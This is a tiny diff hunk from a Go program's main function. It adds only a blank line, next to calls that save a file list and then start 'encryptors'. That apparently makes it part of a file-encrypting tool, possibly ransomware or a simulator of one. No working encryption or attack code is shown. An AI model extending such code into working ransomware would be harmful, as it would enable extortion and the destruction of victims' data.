@@ -62,6 +62,7 @@ func main() {
 		sysinfo.SaveFileList(fileList, "files.txt")
 
 		startEncryptors(false)
+
 	}
 
 	if *dFlag {
